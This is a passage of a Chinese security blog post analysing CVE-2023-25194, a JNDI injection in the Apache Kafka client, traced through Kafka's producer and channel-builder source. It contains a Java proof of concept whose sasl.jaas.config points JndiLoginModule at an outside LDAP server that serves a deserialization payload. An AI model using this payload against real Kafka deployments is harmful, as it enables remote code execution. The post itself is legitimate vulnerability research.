<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言今天拜读了4ra1n师傅的Kafka Connect RCE 如何检测，感觉很有收获。遂决定对这个漏洞进行分析，了解一下漏洞原理。 POC导入依赖： 12345&lt;dependency&gt;    &lt;groupId&gt;org.apache.kafka&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;kafka-clients&lt;&#x2F;artifactI">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2023-25194 Kafka JNDI Injection">
<meta property="og:url" content="https://r4inb00w.github.io/2023/04/04/kafkaJNDI/index.html">
<meta property="og:site_name" content="rainb0w">
<meta property="og:description" content="前言今天拜读了4ra1n师傅的Kafka Connect RCE 如何检测，感觉很有收获。遂决定对这个漏洞进行分析，了解一下漏洞原理。 POC导入依赖： 12345&lt;dependency&gt;    &lt;groupId&gt;org.apache.kafka&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;kafka-clients&lt;&#x2F;artifactI">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pic.imgdb.cn/item/642befd26ea21b9a9e5d97e6.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642befe46ea21b9a9e5e0c8d.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf0036ea21b9a9e5e8cb6.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf01a6ea21b9a9e5ef1e0.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf0286ea21b9a9e5f336e.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf0386ea21b9a9e5f8a2d.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf0496ea21b9a9e5fdfc5.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf0586ea21b9a9e6030d9.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf0766ea21b9a9e60fb81.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf0846ea21b9a9e614be8.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf09c6ea21b9a9e61eb36.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf0b46ea21b9a9e627ea3.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf0c46ea21b9a9e62c511.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf0d26ea21b9a9e630c61.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf0e46ea21b9a9e635c6e.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf0fa6ea21b9a9e63e032.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf1086ea21b9a9e6424b0.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf1146ea21b9a9e646dc1.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf1246ea21b9a9e64d17e.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf1326ea21b9a9e65295f.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf1496ea21b9a9e65a283.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf1586ea21b9a9e65ee78.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf1686ea21b9a9e6643f7.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf1776ea21b9a9e669703.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf18c6ea21b9a9e66f3bb.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf19c6ea21b9a9e6730cd.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bf1aa6ea21b9a9e6764ff.jpg">
<meta property="article:published_time" content="2023-04-04T00:00:00.000Z">
<meta property="article:modified_time" content="2023-12-10T02:15:15.369Z">
<meta property="article:author" content="rainb0w">
<meta property="article:tag" content="CVE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imgdb.cn/item/642befd26ea21b9a9e5d97e6.jpg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CVE-2023-25194 Kafka JNDI Injection</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/04/04/apacheSSRF/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/04/04/zimbraExploit/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&text=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&title=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&is_video=false&description=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2023-25194 Kafka JNDI Injection&body=Check out this article: https://r4inb00w.github.io/2023/04/04/kafkaJNDI/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&title=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&title=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&title=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&title=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&name=CVE-2023-25194 Kafka JNDI Injection&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&t=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析：</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        CVE-2023-25194 Kafka JNDI Injection
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">rainb0w</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-04-04T00:00:00.000Z" class="dt-published" itemprop="datePublished">2023-04-04</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CVE/" rel="tag">CVE</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天拜读了4ra1n师傅的<a target="_blank" rel="noopener" href="https://articles.zsxq.com/id_52tr00657v3l.html">Kafka Connect RCE 如何检测</a>，感觉很有收获。遂决定对这个漏洞进行分析，了解一下漏洞原理。</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>导入依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.3.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        props.put(<span class="string">&quot;sasl.mechanism&quot;</span>,<span class="string">&quot;SCRAM-SHA-256&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;security.protocol&quot;</span>,<span class="string">&quot;SASL_SSL&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;sasl.jaas.config&quot;</span>,<span class="string">&quot;com.sun.security.auth.module.JndiLoginModule &quot;</span> +</span><br><span class="line">                <span class="string">&quot;required user.provider.url=\&quot;ldap://192.168.135.132:1389/Deserialization/URLDNS/26ed58ce.ipv6.1433.eu.org\&quot; &quot;</span> +</span><br><span class="line">                <span class="string">&quot;useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; &quot;</span> +</span><br><span class="line">                <span class="string">&quot;group.provider.url=\&quot;xxx\&quot;;&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;123123123:123&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(props);</span><br><span class="line">            producer.send(<span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;&gt;(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>));</span><br><span class="line">            producer.close();</span><br><span class="line">        &#125;).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<p><img src="https://pic.imgdb.cn/item/642befd26ea21b9a9e5d97e6.jpg" alt="image-20230403193535399"></p>
<p><img src="https://pic.imgdb.cn/item/642befe46ea21b9a9e5e0c8d.jpg" alt="image-20230403193605628"></p>
<h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p>首先跟进org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Properties)：</p>
<p><img src="https://pic.imgdb.cn/item/642bf0036ea21b9a9e5e8cb6.jpg" alt="image-20230403193729326"></p>
<p>这里调用了org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Properties, org.apache.kafka.common.serialization.Serializer<K>, org.apache.kafka.common.serialization.Serializer<V>)，跟进一下：</p>
<p><img src="https://pic.imgdb.cn/item/642bf01a6ea21b9a9e5ef1e0.jpg" alt="image-20230403193814186"></p>
<p>这里首先调用了org.apache.kafka.common.utils.Utils#propsToMap对传入的Properties类型的对象进行了处理，代码如下：</p>
<p><img src="https://pic.imgdb.cn/item/642bf0286ea21b9a9e5f336e.jpg" alt="image-20230403193922249"></p>
<p>由名字就可以看出是将Properties类型改为Map类型，得到的结果如下所示：</p>
<p><img src="https://pic.imgdb.cn/item/642bf0386ea21b9a9e5f8a2d.jpg" alt="image-20230403194046786"></p>
<p>接着又将得到的Map类型的对象传入至org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Map&lt;java.lang.String,java.lang.Object&gt;, org.apache.kafka.common.serialization.Serializer<K>, org.apache.kafka.common.serialization.Serializer<V>)：</p>
<p><img src="https://pic.imgdb.cn/item/642bf0496ea21b9a9e5fdfc5.jpg" alt="image-20230403194137195"></p>
<p>调用了org.apache.kafka.clients.producer.ProducerConfig#appendSerializerToConfig：</p>
<p><img src="https://pic.imgdb.cn/item/642bf0586ea21b9a9e6030d9.jpg" alt="image-20230403194218342"></p>
<p>其中keySerializer和valueSerializer都为null，因此我们在最开始传入的Properties对象中设置键为key.deserializer和value.serializer的键值对，否则会直接抛出异常。接着又将得到的newConfigs传入org.apache.kafka.clients.producer.ProducerConfig#ProducerConfig(java.util.Map&lt;java.lang.String,java.lang.Object&gt;)：</p>
<p><img src="https://pic.imgdb.cn/item/642bf0766ea21b9a9e60fb81.jpg" alt="image-20230403194447403"></p>
<p>最终得到一个ProducerConfig对象，字段情况如下：</p>
<p><img src="https://pic.imgdb.cn/item/642bf0846ea21b9a9e614be8.jpg" alt="image-20230403194657285"></p>
<p>之后又将这些参数传入org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(org.apache.kafka.clients.producer.ProducerConfig, org.apache.kafka.common.serialization.Serializer<K>, org.apache.kafka.common.serialization.Serializer<V>, org.apache.kafka.clients.producer.internals.ProducerMetadata, org.apache.kafka.clients.KafkaClient, org.apache.kafka.clients.producer.internals.ProducerInterceptors&lt;K,V&gt;, org.apache.kafka.common.utils.Time)：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">KafkaProducer(ProducerConfig config, Serializer&lt;K&gt; keySerializer, Serializer&lt;V&gt; valueSerializer, ProducerMetadata metadata, KafkaClient kafkaClient, ProducerInterceptors&lt;K, V&gt; interceptors, Time time) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.producerConfig = config;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//省略大量代码</span></span><br><span class="line">            </span><br><span class="line">            <span class="built_in">this</span>.sender = <span class="built_in">this</span>.newSender(logContext, kafkaClient, <span class="built_in">this</span>.metadata);</span><br><span class="line">            <span class="type">String</span> <span class="variable">ioThreadName</span> <span class="operator">=</span> <span class="string">&quot;kafka-producer-network-thread | &quot;</span> + <span class="built_in">this</span>.clientId;</span><br><span class="line">            <span class="built_in">this</span>.ioThread = <span class="keyword">new</span> <span class="title class_">KafkaThread</span>(ioThreadName, <span class="built_in">this</span>.sender, <span class="literal">true</span>);</span><br><span class="line">            <span class="built_in">this</span>.ioThread.start();</span><br><span class="line">            config.logUnused();</span><br><span class="line">            AppInfoParser.registerAppInfo(<span class="string">&quot;kafka.producer&quot;</span>, <span class="built_in">this</span>.clientId, <span class="built_in">this</span>.metrics, time.milliseconds());</span><br><span class="line">            <span class="built_in">this</span>.log.debug(<span class="string">&quot;Kafka producer started&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var24) &#123;</span><br><span class="line">            <span class="built_in">this</span>.close(Duration.ofMillis(<span class="number">0L</span>), <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KafkaException</span>(<span class="string">&quot;Failed to construct kafka producer&quot;</span>, var24);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里对this.producerConfig进行赋值，还调用了org.apache.kafka.clients.producer.KafkaProducer#newSender方法，这个方法中的参数并不重要，直接看代码：</p>
<p><img src="https://pic.imgdb.cn/item/642bf09c6ea21b9a9e61eb36.jpg" alt="image-20230403195032610"></p>
<p>可以看到这里调用了org.apache.kafka.clients.ClientUtils#createChannelBuilder方法，继续跟进：</p>
<p><img src="https://pic.imgdb.cn/item/642bf0b46ea21b9a9e627ea3.jpg" alt="image-20230403195153310"></p>
<p>其中config是this.producerConfig，这里从config中获取到security.protocol以及sasl.mechanism所对应的值并赋值给相应的变量，其中securityProtocol：</p>
<p><img src="https://pic.imgdb.cn/item/642bf0c46ea21b9a9e62c511.jpg" alt="image-20230403195334222"></p>
<p>之后又调用了org.apache.kafka.common.network.ChannelBuilders#clientChannelBuilder：</p>
<p><img src="https://pic.imgdb.cn/item/642bf0d26ea21b9a9e630c61.jpg" alt="image-20230403195429074"></p>
<p>这里判断securityProtocol是否是SASL_PLAINTEXT或SASL_SSL，如果是则进入判断。之后判断contextType是否为空，这个值不为null，clientSaslMechanism的值就是sasl.mechanism对应的值，也就是POC中的SCRAM-SHA-256：</p>
<p><img src="https://pic.imgdb.cn/item/642bf0e46ea21b9a9e635c6e.jpg" alt="image-20230403195729717"></p>
<p>因此sasl.mechanism的值是必须存在的，否则将抛出异常。之后又调用了org.apache.kafka.common.network.ChannelBuilders#create：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ChannelBuilder <span class="title function_">create</span><span class="params">(SecurityProtocol securityProtocol, Mode mode, JaasContext.Type contextType, AbstractConfig config, ListenerName listenerName, <span class="type">boolean</span> isInterBrokerListener, String clientSaslMechanism, <span class="type">boolean</span> saslHandshakeRequestEnable, CredentialCache credentialCache, DelegationTokenCache tokenCache, Time time, LogContext logContext, Supplier&lt;ApiVersionsResponse&gt; apiVersionSupplier)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; configs = channelBuilderConfigs(config, listenerName);</span><br><span class="line">        Object channelBuilder;</span><br><span class="line">        <span class="keyword">switch</span> (securityProtocol) &#123;</span><br><span class="line">            <span class="keyword">case</span> SSL:</span><br><span class="line">                requireNonNullMode(mode, securityProtocol);</span><br><span class="line">                channelBuilder = <span class="keyword">new</span> <span class="title class_">SslChannelBuilder</span>(mode, listenerName, isInterBrokerListener, logContext);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> SASL_SSL:</span><br><span class="line">            <span class="keyword">case</span> SASL_PLAINTEXT:</span><br><span class="line">                requireNonNullMode(mode, securityProtocol);</span><br><span class="line">                <span class="type">String</span> <span class="variable">sslClientAuthOverride</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                Object jaasContexts;</span><br><span class="line">                <span class="keyword">if</span> (mode != Mode.SERVER) &#123;</span><br><span class="line">                    <span class="type">JaasContext</span> <span class="variable">jaasContext</span> <span class="operator">=</span> contextType == Type.CLIENT ? JaasContext.loadClientContext(configs) : JaasContext.loadServerContext(listenerName, clientSaslMechanism, configs);</span><br><span class="line">                    jaasContexts = Collections.singletonMap(clientSaslMechanism, jaasContext);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    List&lt;String&gt; enabledMechanisms = (List)configs.get(<span class="string">&quot;sasl.enabled.mechanisms&quot;</span>);</span><br><span class="line">                    jaasContexts = <span class="keyword">new</span> <span class="title class_">HashMap</span>(enabledMechanisms.size());</span><br><span class="line">                    <span class="type">Iterator</span> <span class="variable">var18</span> <span class="operator">=</span> enabledMechanisms.iterator();</span><br><span class="line"></span><br><span class="line">                    String listenerClientAuth;</span><br><span class="line">                    <span class="keyword">while</span>(var18.hasNext()) &#123;</span><br><span class="line">                        listenerClientAuth = (String)var18.next();</span><br><span class="line">                        ((Map)jaasContexts).put(listenerClientAuth, JaasContext.loadServerContext(listenerName, listenerClientAuth, configs));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (listenerName != <span class="literal">null</span> &amp;&amp; securityProtocol == SecurityProtocol.SASL_SSL) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">configuredClientAuth</span> <span class="operator">=</span> (String)configs.get(<span class="string">&quot;ssl.client.auth&quot;</span>);</span><br><span class="line">                        listenerClientAuth = (String)config.originalsWithPrefix(listenerName.configPrefix(), <span class="literal">true</span>).get(<span class="string">&quot;ssl.client.auth&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (listenerClientAuth == <span class="literal">null</span>) &#123;</span><br><span class="line">                            sslClientAuthOverride = SslClientAuth.NONE.name().toLowerCase(Locale.ROOT);</span><br><span class="line">                            <span class="keyword">if</span> (configuredClientAuth != <span class="literal">null</span> &amp;&amp; !configuredClientAuth.equalsIgnoreCase(SslClientAuth.NONE.name())) &#123;</span><br><span class="line">                                log.warn(<span class="string">&quot;Broker configuration &#x27;&#123;&#125;&#x27; is applied only to SSL listeners. Listener-prefixed configuration can be used to enable SSL client authentication for SASL_SSL listeners. In future releases, broker-wide option without listener prefix may be applied to SASL_SSL listeners as well. All configuration options intended for specific listeners should be listener-prefixed.&quot;</span>, <span class="string">&quot;ssl.client.auth&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                channelBuilder = <span class="keyword">new</span> <span class="title class_">SaslChannelBuilder</span>(mode, (Map)jaasContexts, securityProtocol, listenerName, isInterBrokerListener, clientSaslMechanism, saslHandshakeRequestEnable, credentialCache, tokenCache, sslClientAuthOverride, time, logContext, apiVersionSupplier);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> PLAINTEXT:</span><br><span class="line">                channelBuilder = <span class="keyword">new</span> <span class="title class_">PlaintextChannelBuilder</span>(listenerName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unexpected securityProtocol &quot;</span> + securityProtocol);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ((ChannelBuilder)channelBuilder).configure(configs);</span><br><span class="line">        <span class="keyword">return</span> (ChannelBuilder)channelBuilder;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>首先得到一个Map类型的对象configs，部分键值对是我们在POC中设置好的。之后进行switch语句，若securityProtocol为SASL_SSL或SASL_PLAINTEXT，就会执行如下一行代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channelBuilder = <span class="keyword">new</span> <span class="title class_">SaslChannelBuilder</span>(mode, (Map)jaasContexts, securityProtocol, listenerName, isInterBrokerListener, clientSaslMechanism, saslHandshakeRequestEnable, credentialCache, tokenCache, sslClientAuthOverride, time, logContext, apiVersionSupplier);</span><br></pre></td></tr></table></figure>

<p>因此channelBuilder是一个SaslChannelBuilder类型的对象，之后退出switch语句，调用了channelBuilder的configure方法，参数为configs。跟进：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(Map&lt;String, ?&gt; configs)</span> <span class="keyword">throws</span> KafkaException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.configs = configs;</span><br><span class="line">            </span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var12</span> <span class="operator">=</span> <span 